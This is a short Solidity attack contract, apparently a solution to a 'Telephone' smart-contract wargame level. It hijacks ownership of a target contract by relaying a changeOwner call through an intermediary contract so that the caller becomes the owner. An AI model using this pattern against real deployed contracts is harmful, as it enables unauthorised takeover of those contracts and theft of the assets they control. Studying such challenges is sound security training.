// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Intermediate.sol";

contract TelephoneAttack {

  Intermediate intermediateContract;

  constructor(address _intermediateContractAddress) {
    intermediateContract = Intermediate(_intermediateContractAddress);
  }

  function changeOwner() public {
    intermediateContract.changeOwner(msg.sender);
  }
}